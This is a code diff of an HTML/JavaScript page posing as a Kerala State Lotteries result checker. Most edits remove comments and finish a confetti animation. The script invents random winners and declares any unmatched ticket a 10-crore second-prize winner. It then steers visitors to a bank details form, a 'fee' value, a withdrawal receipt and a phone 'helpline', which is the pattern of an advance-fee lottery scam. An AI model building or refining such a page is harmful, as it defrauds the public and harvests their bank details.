@@ -28,8 +28,6 @@
       margin: 10px auto 40px auto;
       position: relative;
     }
-
-    /* Confetti Particle Canvas */
     #confettiCanvas {
       position: fixed;
       top: 0;
@@ -40,8 +38,6 @@
       z-index: 9999;
       display: none;
     }
-
-    /* Helpline Top Bar */
     .helpline-bar {
       background: linear-gradient(90deg, #dc2626, #b91c1c);
       color: #fff;
@@ -55,8 +51,6 @@
       border: 1px solid #fecaca;
     }
     .helpline-bar a { color: #fef08a; text-decoration: none; margin-left: 5px; }
-
-    /* Colorful Card Themes */
     .card-page {
       background: linear-gradient(180deg, #ffffff 0%, #fef3c7 100%);
       padding: 22px 18px;
@@ -65,8 +59,6 @@
       border: 3px solid #f59e0b;
       margin-bottom: 15px;
     }
-
-    /* Colorful Poster */
     .banner {
       background: linear-gradient(135deg, #b45309, #d97706, #f59e0b);
       border-radius: 14px;
@@ -80,8 +72,6 @@
     .banner h1 { font-size: 21px; font-weight: 900; letter-spacing: 1px; color: #ffffff; text-shadow: 1px 2px 4px rgba(0,0,0,0.3); }
     .banner p { font-size: 13px; font-weight: 700; color: #fef08a; margin-top: 4px; }
     .banner .bumper { font-size: 18px; font-weight: 900; color: #fff; margin-top: 6px; }
-
-    /* Inputs & Buttons */
     .input-group { margin-bottom: 14px; }
     .input-label { display: block; font-size: 13px; font-weight: 800; color: #1e3a8a; margin-bottom: 5px; }
     input {
@@ -96,7 +86,6 @@
       outline: none;
     }
     input:focus { border-color: #2563eb; box-shadow: 0 0 10px rgba(37,99,235,0.25); }
-    
     .btn {
       width: 100%;
       padding: 14px;
@@ -116,8 +105,6 @@
     .btn-green { background: linear-gradient(90deg, #15803d, #16a34a); }
     .btn-amber { background: linear-gradient(90deg, #b45309, #d97706); }
     .btn-secondary { background: linear-gradient(90deg, #475569, #64748b); margin-top: 10px; }
-
-    /* Result Details Box */
     .result-details-box {
       background: linear-gradient(135deg, #eff6ff, #dbeafe);
       border: 2px dashed #2563eb;
@@ -135,8 +122,6 @@
     .result-row:last-child { border-bottom: none; }
     .row-title { font-weight: 700; color: #1e3a8a; }
     .row-val { font-weight: 800; color: #0f172a; }
-
-    /* Random Winners Table */
     .winners-box {
       margin-top: 20px;
       background: #fffbeb;
@@ -173,8 +158,6 @@
       color: #334155;
       border: 1px solid #cbd5e1;
     }
-
-    /* Star Ultra Highlight */
     .user-winning-tag {
       background: linear-gradient(90deg, #f59e0b, #ef4444) !important;
       color: #ffffff !important;
@@ -198,12 +181,11 @@
 <canvas id="confettiCanvas"></canvas>
 
 <div class="wrapper">
-  <!-- Helpline Bar -->
   <div class="helpline-bar">
     📞 Customer Care Helpline: <a href="tel:8709171965">+91 8709171965</a>
   </div>
 
-  <!-- PAGE 1: SEARCH & GENERAL WINNERS -->
+  <!-- PAGE 1: SEARCH & WINNERS -->
   <div id="pageSearch" class="card-page">
     <div class="banner">
       <h1>Kerala State Lotteries</h1>
@@ -223,7 +205,7 @@
     </div>
   </div>
 
-  <!-- PAGE 2: RESULT CELEBRATION PAGE -->
+  <!-- PAGE 2: RESULT CELEBRATION -->
   <div id="pageResult" class="card-page" style="display:none; background: linear-gradient(180deg, #ecfdf5 0%, #fef3c7 100%); border-color: #10b981;">
     <div style="text-align:center; padding: 10px 0;">
       <div style="font-size:45px;">🎉 🏆 🎊</div>
@@ -242,7 +224,7 @@
     </div>
   </div>
 
-  <!-- PAGE 3: WITHDRAW DETAILS FORM PAGE -->
+  <!-- PAGE 3: WITHDRAW DETAILS FORM -->
   <div id="pageWithdraw" class="card-page" style="display:none;">
     <div style="text-align:center; margin-bottom:15px;">
       <h2 style="color:#1e3a8a; font-size: 20px; font-weight: 900;">Bank Details Form</h2>
@@ -284,7 +266,7 @@
     </form>
   </div>
 
-  <!-- PAGE 4: FINAL SUCCESS WITHDRAWAL PAGE -->
+  <!-- PAGE 4: FINAL CONFIRMATION RECEIPT -->
   <div id="pageConfirm" class="card-page" style="display:none; background: linear-gradient(180deg, #ecfdf5 0%, #eff6ff 100%); border-color: #2563eb;">
     <div style="text-align:center; padding:10px 0;">
       <div style="font-size:42px;">✅ 💳</div>
@@ -313,7 +295,6 @@
 <script>
   const API_URL = "https://sheetdb.io/api/v1/osehsg02p213h";
 
-  // Prize slab configurations
   const prizeSlabs = [
     { rank: "1st Prize", amount: "25 Cr", count: 1 },
     { rank: "2nd Prize", amount: "10 Cr", count: 1 },
@@ -336,12 +317,10 @@
     status: "Active"
   };
 
-  // Generate random tickets
   function randomTicket() {
     return "KL-" + Math.floor(100000 + Math.random() * 900000);
   }
 
-  // Prepopulate winners
   let liveWinners = prizeSlabs.map(slab => {
     let tickets = [];
     for (let i = 0; i < slab.count; i++) {
@@ -350,7 +329,6 @@
     return { ...slab, tickets };
   });
 
-  // Render winner tickets list
   function renderAllWinners(highlightTicket = "", targetElemId = "winnersList") {
     const container = document.getElementById(targetElemId);
     if (!container) return;
@@ -382,7 +360,6 @@
 
   renderAllWinners("", "winnersList");
 
-  // Page switcher
   function showPage(pageId) {
     ['pageSearch', 'pageResult', 'pageWithdraw', 'pageConfirm'].forEach(id => {
       document.getElementById(id).style.display = (id === pageId) ? 'block' : 'none';
@@ -390,7 +367,6 @@
     window.scrollTo({ top: 0, behavior: 'smooth' });
   }
 
-  // Check Result with Celebration
   async function checkResult() {
     const rawVal = document.getElementById("searchKey").value.trim();
     if (!rawVal) {
@@ -417,14 +393,12 @@
         currentWinner.fee = item.fee || "0";
         currentWinner.status = item.status || "Active";
       } else {
-        // Fallback default sample if ticket not found
         currentWinner.ticket = rawVal;
         currentWinner.name = "Lucky Winner";
         currentWinner.prize = "2nd Prize";
         currentWinner.amount = "10 Cr";
       }
 
-      // Automatically place user's ticket in matching prize slab
       liveWinners.forEach(slab => {
         slab.tickets = slab.tickets.filter(t => t.toLowerCase() !== currentWinner.ticket.toLowerCase());
         const matchRegex = new RegExp(slab.rank.replace(/\s+/g, ''), 'i');
@@ -435,7 +409,6 @@
         }
       });
 
-      // Render Result Card Content
       document.getElementById("resultDetailsBox").innerHTML = `
         <div class="result-row"><span class="row-title">Customer Name:</span><span class="row-val" style="color:#1d4ed8;">${currentWinner.name}</span></div>
         <div class="result-row"><span class="row-title">Ticket Number:</span><span class="row-val" style="color:#b45309; font-size:16px;">⭐ ${currentWinner.ticket}</span></div>
@@ -454,7 +427,6 @@
     }
   }
 
-  // Go to withdraw form page
   function goToWithdrawForm() {
     document.getElementById("formClaimTicket").innerText = currentWinner.ticket;
     document.getElementById("formClaimPrize").innerText = currentWinner.amount;
@@ -462,7 +434,6 @@
     showPage("pageWithdraw");
   }
 
-  // Mask account in real-time
   function maskAccRealtime(val) {
     const clean = val.replace(/\s+/g, '');
     let masked = "XXXX-XXXX-XXXX";
@@ -475,7 +446,6 @@
     return masked;
   }
 
-  // Submit Bank Details & Open Final Page
   function handleAccountSubmit(e) {
     e.preventDefault();
     const name = document.getElementById("custName").value.trim();
@@ -496,7 +466,6 @@
     fireCelebrationConfetti();
   }
 
-  // Celebration Fireworks / Confetti
   function fireCelebrationConfetti() {
     const canvas = document.getElementById('confettiCanvas');
     const ctx = canvas.getContext('2d');
@@ -514,4 +483,34 @@
         r: Math.random() * 6 + 3,
         dx: (Math.random() - 0.5) * 16,
         dy: (Math.random() - 0.7) * 16,
-        color: 
+        color: colors[Math.floor(Math.random() * colors.length)]
+      });
+    }
+
+    let animationFrames = 0;
+    function renderConfetti() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      particles.forEach(p => {
+        p.x += p.dx;
+        p.y += p.dy;
+        p.dy += 0.25;
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+        ctx.fillStyle = p.color;
+        ctx.fill();
+      });
+
+      animationFrames++;
+      if (animationFrames < 110) {
+        requestAnimationFrame(renderConfetti);
+      } else {
+        canvas.style.display = 'none';
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+      }
+    }
+    renderConfetti();
+  }
+</script>
+
+</body>
+</html>
